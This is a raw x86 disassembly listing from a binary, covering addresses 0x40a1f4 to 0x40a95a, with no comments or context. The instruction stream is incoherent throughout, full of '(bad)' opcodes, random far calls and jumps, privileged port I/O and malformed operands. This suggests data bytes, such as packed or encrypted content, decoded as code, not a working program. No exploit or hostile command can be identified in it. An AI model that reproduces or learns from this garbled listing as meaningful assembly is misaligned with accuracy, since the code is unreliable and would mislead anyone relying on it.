  40a1f4:	imul   ecx,DWORD PTR [ebp-0x77],0xffffffc1
  40a1f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1f9:	out    0x90,eax
  40a1fb:	out    dx,al
  40a1fc:	sub    eax,0x19723e
  40a201:	(bad)  
  40a202:	imul   esi,DWORD PTR [ebx+0x4b8f6cd],0xf882a473
  40a20c:	int3   
  40a20d:	and    al,0x43
  40a20f:	in     al,dx
  40a210:	jge    0x40a1c0
  40a212:	xor    ebx,eax
  40a214:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a215:	aad    0x72
  40a217:	clc    
  40a218:	lea    edx,ds:0xcda98f05
  40a21e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a21f:	mov    ds:0xbf8cda40,eax
  40a224:	lea    esi,[ebx+0x6a]
  40a227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a228:	inc    ebp
  40a229:	les    edx,FWORD PTR [ebx+0x2a]
  40a22c:	jne    0x40a297
  40a22e:	frstor [eax+0x11373ba8]
  40a234:	xor    DWORD PTR [edx+eax*2+0xd83f01f],esi
  40a23b:	pushf  
  40a23c:	inc    edi
  40a23d:	into   
  40a23e:	leave  
  40a23f:	dec    ecx
  40a240:	and    eax,0x312bb912
  40a245:	cs das 
  40a247:	pop    ecx
  40a248:	mov    edi,0xec0a7d9d
  40a24d:	in     eax,dx
  40a24e:	xchg   ebx,ebx
  40a250:	loope  0x40a2c1
  40a252:	das    
  40a253:	or     ch,BYTE PTR [ebx-0x3e]
  40a256:	or     edx,DWORD PTR [ebx+0x713b31d6]
  40a25c:	(bad)  
  40a25d:	sti    
  40a25e:	mov    eax,0x7321ab74
  40a263:	xchg   ebp,eax
  40a264:	xor    esp,ebp
  40a266:	pop    ebx
  40a267:	xor    esp,DWORD PTR [edx]
  40a269:	popf   
  40a26a:	fidivr DWORD PTR [esp+eiz*4]
  40a26d:	dec    ebp
  40a26e:	mov    edi,0x1d731ec0
  40a273:	imul   edi
  40a275:	cmp    al,0xae
  40a277:	dec    ebx
  40a278:	imul   ebx,esi,0x1c
  40a27b:	push   esi
  40a27c:	test   ecx,edx
  40a27e:	mov    ss,WORD PTR [ebp-0x3982eb62]
  40a284:	enter  0x7b0d,0x8b
  40a288:	lahf   
  40a289:	stc    
  40a28a:	inc    ebx
  40a28b:	pop    eax
  40a28c:	loop   0x40a2fe
  40a28e:	xchg   ebp,eax
  40a28f:	push   ebp
  40a290:	out    dx,al
  40a291:	test   BYTE PTR [ebx],0xaf
  40a294:	inc    eax
  40a295:	std    
  40a296:	ret    0xa8bf
  40a299:	or     al,0xb
  40a29b:	push   esi
  40a29c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a29d:	icebp  
  40a29e:	in     eax,dx
  40a29f:	(bad)  
  40a2a0:	pop    ds
  40a2a1:	push   0xefb9ed12
  40a2a6:	sub    edx,eax
  40a2a8:	inc    esi
  40a2a9:	mov    bh,0xed
  40a2ab:	pop    ds
  40a2ac:	xor    DWORD PTR [ebp+0x37159eb3],ebx
  40a2b2:	test   al,0x74
  40a2b4:	cdq    
  40a2b5:	aaa    
  40a2b6:	dec    esi
  40a2b7:	mov    ch,BYTE PTR [esi+0x7a5931e6]
  40a2bd:	and    eax,0x54cd6f14
  40a2c2:	jb     0x40a339
  40a2c4:	js     0x40a326
  40a2c6:	xor    eax,DWORD PTR ds:0xded46213
  40a2cc:	clc    
  40a2cd:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2cf:	inc    edx
  40a2d0:	mov    esi,0x98e7ce61
  40a2d5:	ins    BYTE PTR es:[edi],dx
  40a2d6:	or     eax,0xf6c19abe
  40a2db:	xor    BYTE PTR [edi-0x3b],dl
  40a2de:	mov    ebx,0xdde9ef4f
  40a2e3:	pop    edi
  40a2e4:	rol    BYTE PTR [ebx],0xf9
  40a2e7:	or     eax,0x77de46e1
  40a2ec:	lods   eax,DWORD PTR ds:[esi]
  40a2ed:	or     BYTE PTR [eax+0x16c4fc85],ah
  40a2f3:	cmp    eax,0x27797f4d
  40a2f8:	and    BYTE PTR [esp+esi*2+0x30],0x45
  40a2fd:	je     0x5ac3cc4d
  40a303:	pop    ds
  40a304:	out    dx,eax
  40a305:	push   edx
  40a306:	fistp  QWORD PTR [esi+0x7]
  40a309:	call   0x8302:0xeb0c4b57
  40a310:	retf   
  40a311:	and    al,0x78
  40a313:	pop    esi
  40a314:	pop    esi
  40a315:	dec    al
  40a317:	push   esi
  40a318:	sbb    esp,ebx
  40a31a:	aaa    
  40a31b:	adc    eax,0x6124a308
  40a320:	add    BYTE PTR [edx],bh
  40a322:	jns    0x40a302
  40a324:	rcr    bh,0x87
  40a327:	mov    BYTE PTR [esi-0xc],ch
  40a32a:	xor    dl,BYTE PTR fs:[ebx]
  40a32d:	outs   dx,BYTE PTR ds:[esi]
  40a32e:	fld    TBYTE PTR [edx+0x1e148b24]
  40a334:	adc    esi,DWORD PTR [edi+0x63e43e3b]
  40a33a:	fisttp DWORD PTR [esi]
  40a33c:	mov    ds:0x4ecb1955,al
  40a341:	push   es
  40a342:	push   ebp
  40a343:	(bad)  
  40a344:	leave  
  40a345:	lahf   
  40a346:	imul   esp
  40a348:	and    eax,0x2d8a0258
  40a34d:	arpl   WORD PTR [ecx],ax
  40a34f:	pop    es
  40a350:	int3   
  40a351:	mov    DWORD PTR [ebp+0x74],esi
  40a354:	or     eax,0x67f031ca
  40a359:	cdq    
  40a35a:	xchg   esi,eax
  40a35b:	inc    esi
  40a35c:	dec    edi
  40a35d:	aam    0xa5
  40a35f:	mov    eax,0x6ef26bd4
  40a364:	in     eax,dx
  40a365:	dec    esi
  40a366:	inc    esi
  40a367:	add    BYTE PTR [edx],dl
  40a369:	js     0x40a3aa
  40a36b:	mov    dl,0x64
  40a36d:	dec    edi
  40a36e:	loopne 0x40a325
  40a370:	mov    edx,DWORD PTR [eax+0x14e24279]
  40a376:	add    BYTE PTR ds:0xed28f00e,dh
  40a37c:	mov    ebp,0x385e755e
  40a381:	mov    ebp,0xbdba30a7
  40a386:	mov    eax,DWORD PTR [eax]
  40a388:	ja     0x40a33f
  40a38a:	test   eax,0x73444fb0
  40a38f:	mov    ebp,0x822b3057
  40a394:	daa    
  40a395:	hlt    
  40a396:	fild   DWORD PTR [esp+eax*8]
  40a399:	loope  0x40a40d
  40a39b:	cli    
  40a39c:	das    
  40a39d:	add    edi,ecx
  40a39f:	fild   DWORD PTR [ecx-0x332c7110]
  40a3a5:	sub    DWORD PTR [ebp+edi*1+0x7b],eax
  40a3a9:	jl     0x40a3a8
  40a3ab:	sar    DWORD PTR [eax+ecx*1+0x6],cl
  40a3af:	xor    BYTE PTR [ebp+0x66],al
  40a3b2:	inc    ebp
  40a3b3:	popf   
  40a3b4:	dec    eax
  40a3b5:	leave  
  40a3b6:	add    al,0x9e
  40a3b8:	jecxz  0x40a3d7
  40a3ba:	adc    BYTE PTR [eax-0x44],0xc
  40a3be:	aam    0x51
  40a3c0:	jmp    0x40a3dc
  40a3c2:	cmp    ebp,edx
  40a3c4:	push   0xfa976dee
  40a3c9:	loopne 0x40a3a3
  40a3cb:	or     al,0x38
  40a3cd:	xor    BYTE PTR [esi+0x30],0x9c
  40a3d1:	adc    BYTE PTR [ebx+0x41],bl
  40a3d4:	lods   al,BYTE PTR ds:[esi]
  40a3d5:	mov    edi,0x97ea28cc
  40a3da:	rcl    eax,cl
  40a3dc:	hlt    
  40a3dd:	stos   BYTE PTR es:[edi],al
  40a3de:	xor    DWORD PTR [edi],ebp
  40a3e0:	mov    dh,0x9c
  40a3e2:	clc    
  40a3e3:	fmul   QWORD PTR ds:0x666c829a
  40a3e9:	mov    ch,BYTE PTR [edi-0x54]
  40a3ec:	stos   BYTE PTR es:[edi],al
  40a3ed:	add    DWORD PTR [ecx-0x6a895e88],edx
  40a3f3:	inc    esp
  40a3f4:	dec    ebx
  40a3f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3f6:	pushf  
  40a3f7:	inc    ebx
  40a3f8:	xchg   ecx,eax
  40a3f9:	dec    ecx
  40a3fa:	adc    al,0x65
  40a3fc:	cmc    
  40a3fd:	xchg   ecx,eax
  40a3fe:	sbb    al,0x84
  40a400:	xchg   DWORD PTR [edx-0x73],esi
  40a403:	dec    eax
  40a404:	and    al,0x50
  40a406:	cli    
  40a407:	or     eax,0xe0077d5d
  40a40c:	cmp    ebp,DWORD PTR [ebx-0x18fcbe89]
  40a412:	add    BYTE PTR [esp+ecx*4+0x9],dl
  40a416:	cmp    dh,ah
  40a418:	jge    0x40a3ea
  40a41a:	retf   0x75d8
  40a41d:	imul   esp,DWORD PTR [edx-0x4f0724f0],0x48b20e08
  40a427:	jmp    0x86b8115b
  40a42c:	fdivr  QWORD PTR [ebx-0x3b987eeb]
  40a432:	pop    esp
  40a433:	push   ecx
  40a434:	lods   eax,DWORD PTR ds:[esi]
  40a435:	loop   0x40a435
  40a437:	sbb    dh,cl
  40a439:	or     ecx,edx
  40a43b:	scas   al,BYTE PTR es:[edi]
  40a43c:	mov    ebp,0xb7eb56c1
  40a441:	call   0xafff:0x64edea42
  40a448:	fcmove st,st(0)
  40a44a:	in     al,dx
  40a44b:	push   ecx
  40a44c:	dec    ebx
  40a44d:	adc    eax,0x63d386ab
  40a452:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a453:	outs   dx,DWORD PTR ds:[esi]
  40a454:	xor    ebx,DWORD PTR [ebp-0x22]
  40a457:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a458:	sub    eax,0x2627e494
  40a45d:	mov    edx,esp
  40a45f:	sbb    esi,edi
  40a461:	push   ebx
  40a462:	in     eax,0x7e
  40a464:	popf   
  40a465:	adc    bl,bh
  40a467:	outs   dx,BYTE PTR ds:[esi]
  40a468:	inc    ebx
  40a469:	popa   
  40a46a:	ror    DWORD PTR [ecx],1
  40a46c:	inc    edi
  40a46d:	fsub   DWORD PTR [edi+eiz*4-0x66]
  40a471:	inc    ebx
  40a472:	sub    eax,0x61d65f77
  40a477:	sbb    al,BYTE PTR [ebp-0x1b]
  40a47a:	jle    0x40a493
  40a47c:	jne    0x40a441
  40a47e:	loope  0x40a49b
  40a480:	mov    ds:0x5d0369ef,al
  40a485:	cmp    ah,BYTE PTR [esi]
  40a487:	jnp    0x40a4d3
  40a489:	jb     0x40a509
  40a48b:	jbe    0x40a4f7
  40a48d:	inc    ebp
  40a48e:	out    dx,eax
  40a48f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a490:	jb     0x40a4df
  40a492:	lds    esi,FWORD PTR [ecx]
  40a494:	mov    cl,0x5c
  40a496:	sub    BYTE PTR [ebx*1+0x5b00d8c5],ah
  40a49d:	lods   al,BYTE PTR ds:[esi]
  40a49e:	and    DWORD PTR [ecx+0xa],edx
  40a4a1:	in     eax,dx
  40a4a2:	ja     0x40a4e5
  40a4a4:	out    dx,eax
  40a4a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a4a6:	ins    DWORD PTR es:[edi],dx
  40a4a7:	push   edi
  40a4a8:	ret    
  40a4a9:	cli    
  40a4aa:	sub    al,0xc3
  40a4ac:	cld    
  40a4ad:	jl     0x40a505
  40a4af:	mov    dl,dh
  40a4b1:	or     al,0x69
  40a4b3:	xor    DWORD PTR [edx+0x4ab5a098],edx
  40a4b9:	outs   dx,DWORD PTR ds:[esi]
  40a4ba:	idiv   BYTE PTR [edi]
  40a4bc:	push   edi
  40a4bd:	nop
  40a4be:	rcl    DWORD PTR [edx-0x1d3ac667],1
  40a4c4:	mov    al,ds:0xb3783f93
  40a4c9:	les    esp,FWORD PTR [eax+0x25aa631d]
  40a4cf:	adc    edx,edx
  40a4d1:	mov    dl,0xa4
  40a4d3:	ins    DWORD PTR es:[edi],dx
  40a4d4:	jg     0x40a462
  40a4d6:	push   ebx
  40a4d7:	mov    esi,0xcfe30e6d
  40a4dc:	mov    bl,0x91
  40a4de:	and    BYTE PTR [eax+0x702d9a1],dl
  40a4e4:	push   ebp
  40a4e5:	cmp    DWORD PTR [edi],0xfffffff1
  40a4e8:	pop    ss
  40a4e9:	daa    
  40a4ea:	outs   dx,DWORD PTR ds:[esi]
  40a4eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4ec:	mov    ebp,0xc98b920a
  40a4f1:	test   DWORD PTR ss:[ecx+0x46fb4c80],eax
  40a4f8:	call   0x9058acc9
  40a4fd:	add    eax,0x7db59fff
  40a502:	ret    0x7a01
  40a505:	mov    al,0x55
  40a507:	inc    ebx
  40a508:	call   0x8eac40cc
  40a50d:	pop    ecx
  40a50e:	xchg   ah,cl
  40a510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a511:	sahf   
  40a512:	call   0xe72a:0x539a2530
  40a519:	mov    edi,0x30237e07
  40a51e:	fidivr DWORD PTR [eax]
  40a520:	lea    eax,[esi-0x12d94f0a]
  40a526:	iret   
  40a527:	mov    eax,0xe2e3ffdc
  40a52c:	xchg   esi,eax
  40a52d:	inc    BYTE PTR [eax]
  40a52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a530:	rcr    DWORD PTR [edi-0x3292c6db],1
  40a536:	mov    WORD PTR [ebx+0x2],?
  40a539:	xchg   ebx,eax
  40a53a:	sbb    BYTE PTR [esi],bh
  40a53c:	stos   DWORD PTR es:[edi],eax
  40a53d:	(bad)  
  40a53e:	xor    eax,0xb60da4ee
  40a543:	mov    cl,0xae
  40a545:	dec    eax
  40a546:	int    0x94
  40a548:	sbb    ch,cl
  40a54a:	cmp    al,0xef
  40a54c:	test   al,0x5b
  40a54e:	popa   
  40a54f:	mov    ah,0xd4
  40a551:	pop    edx
  40a552:	cmc    
  40a553:	or     ah,BYTE PTR [ebp+ecx*4+0x4f]
  40a557:	repz aam 0x87
  40a55a:	rol    BYTE PTR [edi+0x4f4a64e5],cl
  40a560:	jmp    0x63c6b87
  40a565:	jp     0x40a5c2
  40a567:	lds    ecx,FWORD PTR [edi+0x4aa1f203]
  40a56d:	cmp    eax,DWORD PTR [ecx-0x74fbf470]
  40a573:	pop    es
  40a574:	or     esi,DWORD PTR [eax]
  40a576:	cld    
  40a577:	xor    esi,DWORD PTR [ebx-0x3c]
  40a57a:	dec    edi
  40a57b:	packsswb mm5,QWORD PTR [esi-0x37153938]
  40a582:	(bad)  ds:0xa037dfd
  40a588:	loop   0x40a582
  40a58a:	pop    ecx
  40a58b:	cwde   
  40a58c:	sar    BYTE PTR [ebx-0x26],1
  40a58f:	xchg   ebx,eax
  40a590:	(bad)  
  40a591:	jno    0x40a570
  40a593:	inc    ebp
  40a594:	shl    BYTE PTR [ebp+eax*8-0x5e],0x83
  40a599:	dec    esp
  40a59a:	mov    eax,ds:0xeec3c0c6
  40a59f:	sbb    eax,0xb4016b7d
  40a5a4:	mov    esp,0x1c17e2e4
  40a5a9:	inc    edi
  40a5aa:	mov    ?,edi
  40a5ac:	mov    ch,0xd2
  40a5ae:	retf   
  40a5af:	scas   eax,DWORD PTR es:[edi]
  40a5b0:	push   es
  40a5b1:	sub    ah,BYTE PTR [ebx+0x7fca3e72]
  40a5b7:	mov    al,ds:0x1c5b5c5
  40a5bc:	ss push es
  40a5be:	push   esi
  40a5bf:	push   eax
  40a5c0:	add    al,0x63
  40a5c2:	xor    ecx,DWORD PTR ds:0xbc419bcd
  40a5c8:	out    dx,al
  40a5c9:	xchg   esi,eax
  40a5ca:	loopne 0x40a5a5
  40a5cc:	stc    
  40a5cd:	es xchg ebx,eax
  40a5cf:	mov    WORD PTR [eax+0x778b73d4],cs
  40a5d5:	push   ss
  40a5d6:	stos   DWORD PTR es:[edi],eax
  40a5d7:	mov    ch,0x8a
  40a5d9:	fiadd  WORD PTR [edx+ecx*2+0x40016e8f]
  40a5e0:	jns    0x40a5f3
  40a5e2:	cdq    
  40a5e3:	xchg   edi,eax
  40a5e4:	dec    edi
  40a5e5:	dec    esp
  40a5e6:	sti    
  40a5e7:	shl    BYTE PTR [ecx-0x62],1
  40a5ea:	xor    DWORD PTR [edi],ecx
  40a5ec:	out    dx,eax
  40a5ed:	(bad)  
  40a5ef:	gs pop ss
  40a5f1:	or     cl,ah
  40a5f3:	xor    ecx,DWORD PTR [edx+0x65fdfd73]
  40a5f9:	jmp    0x53a1d7e6
  40a5fe:	sbb    BYTE PTR [ebx-0x2d5a251a],0xc7
  40a605:	(bad)  
  40a606:	adc    DWORD PTR [ecx],ecx
  40a608:	addr16 mov al,ds:0x96e5
  40a60c:	inc    edx
  40a60d:	jl     0x40a61f
  40a60f:	in     eax,0x30
  40a611:	mov    ds:0x22e43094,al
  40a616:	or     esi,DWORD PTR [edi]
  40a618:	pop    esp
  40a619:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a61a:	loop   0x40a5dd
  40a61c:	and    eax,0xb437b86f
  40a621:	cmp    eax,0x68ed580c
  40a626:	jae    0x40a666
  40a628:	fild   QWORD PTR [edi+ebp*1-0x7f0cad9d]
  40a62f:	data16 sahf 
  40a631:	inc    edi
  40a632:	pop    ecx
  40a633:	jbe    0x40a62e
  40a635:	shl    dl,0xfd
  40a638:	jmp    0x40a653
  40a63a:	mov    ebx,DWORD PTR [ecx+0x2f]
  40a63d:	xchg   ecx,eax
  40a63e:	push   cs
  40a63f:	gs repz push ebx
  40a642:	fldenv [ebp-0x53]
  40a645:	imul   ebx,DWORD PTR [ebp+0x539115c0],0x9c15ad5c
  40a64f:	inc    ebx
  40a650:	rcl    BYTE PTR fs:[ebp+0x6],cl
  40a654:	push   0x3
  40a656:	(bad)  
  40a657:	enter  0x1a3c,0x3e
  40a65b:	jae    0x40a5e5
  40a65d:	inc    ecx
  40a65e:	sub    esp,ebx
  40a660:	push   ebx
  40a661:	inc    esi
  40a662:	ficomp DWORD PTR [eax+esi*2-0x5f]
  40a666:	jecxz  0x40a6a8
  40a668:	push   edx
  40a669:	jbe    0x40a637
  40a66b:	adc    al,0xde
  40a66d:	jge    0x40a6e4
  40a66f:	rcr    BYTE PTR [ecx-0x25],0xdf
  40a673:	test   bl,bl
  40a675:	cmp    al,0xea
  40a677:	cwde   
  40a678:	xor    BYTE PTR [ebx+0x289c3567],0xd7
  40a67f:	xor    eax,DWORD PTR [ebx-0x54]
  40a682:	dec    edx
  40a683:	lods   al,BYTE PTR ds:[esi]
  40a684:	push   esp
  40a685:	mov    ebp,0x5fc946a4
  40a68a:	rcr    BYTE PTR [edx+0x51ba46ad],cl
  40a690:	mov    ah,0x89
  40a692:	jmp    0xf347efa6
  40a697:	cmp    DWORD PTR [ecx-0xdf95940],0x430f0753
  40a6a1:	or     BYTE PTR [edi],dh
  40a6a3:	stos   BYTE PTR es:[edi],al
  40a6a4:	sbb    BYTE PTR [ecx+0x74],dl
  40a6a7:	mov    ebx,0x153663a2
  40a6ac:	sub    eax,0x732785f2
  40a6b1:	xchg   edx,eax
  40a6b2:	stos   DWORD PTR es:[edi],eax
  40a6b3:	xchg   ecx,eax
  40a6b4:	ret    0x5710
  40a6b7:	mov    ds:0x762fd6d,eax
  40a6bc:	fstp   DWORD PTR [ebp-0xebfd29]
  40a6c2:	mov    ds:0x9bc2d97f,eax
  40a6c7:	(bad)  
  40a6c8:	ror    ah,0xde
  40a6cb:	cs cld 
  40a6cd:	xor    DWORD PTR [edx+0x24336d23],edx
  40a6d3:	rcr    esp,0x19
  40a6d6:	adc    esp,eax
  40a6d8:	stc    
  40a6d9:	fldenv [edi+0x23]
  40a6dc:	pushf  
  40a6dd:	mov    ds:0x61832fe0,al
  40a6e2:	push   ds
  40a6e3:	repnz inc edx
  40a6e5:	and    al,BYTE PTR [edx+edx*4]
  40a6e8:	pushw  ss
  40a6ea:	loope  0x40a71b
  40a6ec:	add    DWORD PTR [edx],eax
  40a6ee:	imul   edx,DWORD PTR [esi],0x2fbe270e
  40a6f4:	sbb    edi,ecx
  40a6f6:	ins    DWORD PTR es:[edi],dx
  40a6f7:	std    
  40a6f8:	mov    ch,0x8b
  40a6fa:	scas   eax,DWORD PTR es:[edi]
  40a6fb:	bound  edx,QWORD PTR [edx+0x5924eee7]
  40a701:	mov    esi,0xd1ac48e6
  40a706:	ret    0xe7f7
  40a709:	ret    0x33bc
  40a70c:	inc    edi
  40a70d:	lss    ecx,FWORD PTR [ebx-0x25508f1c]
  40a714:	(bad)  [edx+0x71]
  40a717:	or     cl,BYTE PTR [ecx+0x2bd201a0]
  40a71d:	loope  0x40a73d
  40a71f:	cmp    al,0x69
  40a721:	jmp    0xdc2f:0x907ed555
  40a728:	int    0x64
  40a72a:	arpl   WORD PTR [eax+0x79],bp
  40a72d:	test   al,0x5a
  40a72f:	mov    al,BYTE PTR [ecx+edi*1+0xf]
  40a733:	fdiv   st(6),st
  40a735:	inc    esp
  40a736:	mov    cl,0x29
  40a738:	xchg   DWORD PTR [edi+0x23],eax
  40a73b:	loope  0x40a6d1
  40a73d:	out    0x62,al
  40a73f:	push   ebx
  40a740:	jmp    0x73e015ee
  40a745:	cli    
  40a746:	dec    esi
  40a747:	hlt    
  40a748:	pop    ecx
  40a749:	in     al,dx
  40a74a:	mov    ebx,DWORD PTR [eax]
  40a74c:	repnz pop ebx
  40a74e:	out    dx,eax
  40a74f:	adc    DWORD PTR [ecx-0x25b09db2],esp
  40a755:	mov    bl,0xee
  40a757:	xchg   al,al
  40a759:	add    ah,dl
  40a75b:	inc    ebx
  40a75c:	mov    ds:0x8ed4b6db,al
  40a761:	div    ebp
  40a763:	dec    eax
  40a764:	and    eax,0xa6f8b456
  40a769:	inc    edi
  40a76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a76b:	pop    esp
  40a76c:	dec    edi
  40a76d:	outs   dx,DWORD PTR ds:[esi]
  40a76e:	mov    ecx,0x9edd1b0d
  40a773:	fs dec ebp
  40a775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a776:	sbb    edx,ebp
  40a778:	scas   eax,DWORD PTR es:[edi]
  40a779:	sar    ah,0x3b
  40a77c:	sub    eax,ebp
  40a77e:	mov    ch,cl
  40a780:	out    dx,al
  40a781:	inc    ebp
  40a782:	arpl   WORD PTR [ebx],si
  40a784:	lock dec esi
  40a786:	mov    ebx,0x88d68622
  40a78b:	lea    eax,[ecx+eiz*4]
  40a78e:	and    BYTE PTR [ebx-0x1f],0xec
  40a792:	cmp    ch,BYTE PTR [edi]
  40a794:	sbb    eax,0x3d3cfc88
  40a799:	lods   eax,DWORD PTR ds:[esi]
  40a79a:	hlt    
  40a79b:	or     BYTE PTR [eax],dl
  40a79d:	test   eax,0xbf8c58f8
  40a7a2:	jbe    0x40a7cd
  40a7a4:	scas   eax,DWORD PTR es:[edi]
  40a7a5:	pop    esp
  40a7a6:	or     ch,BYTE PTR [ebx+0x3c992986]
  40a7ac:	ret    0x439d
  40a7af:	out    0x65,eax
  40a7b1:	or     DWORD PTR [esi+edi*2+0x28],ecx
  40a7b5:	mov    bl,BYTE PTR [esp+edx*4-0x75]
  40a7b9:	adc    DWORD PTR [edi-0x4f],ebp
  40a7bc:	xor    al,0xbb
  40a7be:	cmp    al,0x9a
  40a7c0:	xchg   edi,eax
  40a7c1:	jno    0x40a83c
  40a7c3:	ins    BYTE PTR es:[edi],dx
  40a7c4:	adc    cl,dh
  40a7c6:	sub    eax,0x9eb5d6e6
  40a7cb:	int    0x1e
  40a7cd:	arpl   WORD PTR [edx-0x43c66710],ax
  40a7d3:	pop    edx
  40a7d4:	fnstsw WORD PTR [edx+edx*2]
  40a7d7:	adc    ah,BYTE PTR [edx]
  40a7d9:	ss xchg esi,eax
  40a7db:	xchg   BYTE PTR [edi-0x38],bl
  40a7de:	and    al,bl
  40a7e0:	cli    
  40a7e1:	adc    DWORD PTR [ebx+ecx*4+0x4a3bd86a],esi
  40a7e8:	mov    ebp,0xa2e7f640
  40a7ed:	rcl    esp,cl
  40a7ef:	nop
  40a7f0:	ins    BYTE PTR es:[edi],dx
  40a7f1:	scas   al,BYTE PTR es:[edi]
  40a7f2:	mov    ebp,0x4eb4163a
  40a7f7:	add    al,0x9a
  40a7f9:	push   ebp
  40a7fa:	shl    DWORD PTR [ecx-0x62e21369],1
  40a800:	dec    edx
  40a801:	bnd jo 0x40a786
  40a804:	or     al,0x85
  40a806:	ds stos BYTE PTR es:[edi],al
  40a808:	loope  0x40a7c7
  40a80a:	mov    bl,0x1b
  40a80c:	daa    
  40a80d:	aaa    
  40a80e:	lds    edi,FWORD PTR [ecx+ebp*1]
  40a811:	or     eax,DWORD PTR [edi-0x62db5622]
  40a817:	mov    dl,0x4f
  40a819:	dec    edx
  40a81a:	inc    ecx
  40a81b:	cdq    
  40a81c:	cmc    
  40a81d:	and    BYTE PTR [ecx+0x3f],dl
  40a820:	rcr    BYTE PTR [esi+0x75],1
  40a823:	adc    BYTE PTR gs:[edi+0x32e98ef7],bl
  40a82a:	clc    
  40a82b:	hlt    
  40a82c:	mov    ebx,0x5e1caab1
  40a831:	fnstenv [edx]
  40a833:	loop   0x40a81f
  40a835:	cld    
  40a836:	in     eax,0xa6
  40a838:	xor    bl,BYTE PTR [eax+0x48]
  40a83b:	inc    edx
  40a83c:	arpl   WORD PTR [ebx+0x4ad20efa],bx
  40a842:	imul   edi,esi,0x58
  40a845:	ds retf 
  40a847:	sbb    al,0x93
  40a849:	xchg   ebx,eax
  40a84a:	inc    ecx
  40a84b:	into   
  40a84c:	test   eax,0x74c68e19
  40a851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a852:	rcl    DWORD PTR [edx-0x6858247b],1
  40a858:	pop    ecx
  40a859:	retf   
  40a85a:	mov    fs,WORD PTR [edi+0x24]
  40a85d:	scas   eax,DWORD PTR es:[edi]
  40a85e:	fidiv  WORD PTR [eax]
  40a860:	popa   
  40a861:	repz call 0x4c9df6cd
  40a867:	add    ebx,ebx
  40a869:	sar    bh,0x4b
  40a86c:	xchg   DWORD PTR [edx-0x634ab784],ebp
  40a872:	cs push ebp
  40a874:	sbb    ah,BYTE PTR [ebp-0x3d]
  40a877:	jne    0x40a8a8
  40a879:	inc    ebp
  40a87a:	add    BYTE PTR [eax-0x2d],cl
  40a87d:	cld    
  40a87e:	xchg   ebx,eax
  40a87f:	cmp    eax,0xba950072
  40a884:	xor    bh,BYTE PTR [edi+0x47]
  40a887:	in     al,dx
  40a888:	mov    esi,0x3764e5bd
  40a88d:	retf   0x594e
  40a890:	or     eax,0x8631607c
  40a895:	cdq    
  40a896:	sub    al,0xc9
  40a898:	xchg   ebx,eax
  40a899:	out    dx,eax
  40a89a:	ror    DWORD PTR [ebp-0x2c],0x3f
  40a89e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a89f:	xchg   DWORD PTR [edi+0x69a3555f],eax
  40a8a5:	mov    cl,0xdf
  40a8a7:	rcl    DWORD PTR [edi],cl
  40a8a9:	cmp    ebx,DWORD PTR [esi-0x39]
  40a8ac:	aas    
  40a8ad:	pop    edi
  40a8ae:	cli    
  40a8af:	stos   DWORD PTR es:[edi],eax
  40a8b0:	or     BYTE PTR [eax+eiz*2+0x7c],bl
  40a8b4:	cmp    BYTE PTR [edx],0x4e
  40a8b7:	xor    DWORD PTR [ecx-0x4cb2a6ae],edx
  40a8bd:	xor    BYTE PTR [eax-0x54],0x74
  40a8c1:	jae    0x40a87e
  40a8c3:	ret    
  40a8c4:	cmp    DWORD PTR [esi-0x796aea65],eax
  40a8ca:	int    0xa9
  40a8cc:	(bad)  
  40a8cd:	xlat   BYTE PTR ds:[ebx]
  40a8ce:	dec    ebx
  40a8cf:	lahf   
  40a8d0:	mov    al,ds:0x6647297f
  40a8d5:	fsub   DWORD PTR [edi+0x2b]
  40a8d8:	xor    eax,0x6536794e
  40a8dd:	mov    edi,0xd2bb474b
  40a8e2:	test   DWORD PTR [edx+0x2b],esp
  40a8e5:	and    BYTE PTR [ecx-0x2c4cad69],al
  40a8eb:	adc    al,0xd
  40a8ed:	or     dl,BYTE PTR [edx-0x752deeeb]
  40a8f3:	pop    esp
  40a8f4:	mov    dh,0xf3
  40a8f6:	data16 mov bl,0xd0
  40a8f9:	cmp    eax,0xfa383608
  40a8fe:	ret    
  40a8ff:	adc    al,BYTE PTR [ebx+ebx*4]
  40a902:	xchg   ebp,eax
  40a903:	adc    ah,BYTE PTR [ebx+ebx*1]
  40a906:	bound  ebp,QWORD PTR [edx+0x495f2b55]
  40a90c:	push   eax
  40a90d:	fisub  WORD PTR [eax-0x4fb1eb09]
  40a913:	call   0xec88:0xdb502980
  40a91a:	jg     0x40a95b
  40a91c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a91d:	mov    ah,0xe
  40a91f:	iret   
  40a920:	lea    edi,[esi-0x4c]
  40a923:	aad    0x2e
  40a925:	mov    esp,0xe16ddf9e
  40a92a:	inc    ebx
  40a92b:	mov    bl,0x2b
  40a92d:	shr    DWORD PTR [edx-0x1e],cl
  40a930:	jbe    0x40a914
  40a932:	loope  0x40a90a
  40a934:	adc    DWORD PTR [ebp-0xd974276],0x3bb9aeab
  40a93e:	mov    edi,0xfdc8ba6b
  40a943:	push   edi
  40a944:	fiadd  WORD PTR [edx-0xb2b7562]
  40a94a:	jmp    0x40a992
  40a94c:	shl    BYTE PTR [ecx-0x4e],1
  40a94f:	pop    esi
  40a950:	int    0xe2
  40a952:	pop    ebp
  40a953:	mov    ch,0x86
  40a955:	rcl    ch,1
  40a957:	push   ebp
  40a958:	mov    ah,0x63
  40a95a:	sub    DWORD PTR [ecx-0x7b53b3e8],0xcfd99fb4
